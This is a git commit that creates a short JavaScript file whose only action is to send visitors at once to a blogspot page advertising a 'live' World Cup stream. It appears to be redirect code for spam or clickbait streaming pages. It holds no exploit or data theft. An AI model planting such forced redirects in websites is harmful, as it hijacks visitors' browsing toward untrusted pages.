0b51ad362586fa017b6c03eb70f94ec97c54f3f3
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-07-14 23:19:05 +0700

    Create bloglizaaa.js

---
+++ bloglizaaa.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+
+'https://fullliveeepialaduniaaa2026.blogspot.com/2026/07/live-prancis-vs-spanyol-fifa-world-cup.html',
+'https://fullliveeepialaduniaaa2026.blogspot.com/2026/07/live-prancis-vs-spanyol-fifa-world-cup.html',
+'https://fullliveeepialaduniaaa2026.blogspot.com/2026/07/live-prancis-vs-spanyol-fifa-world-cup.html'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
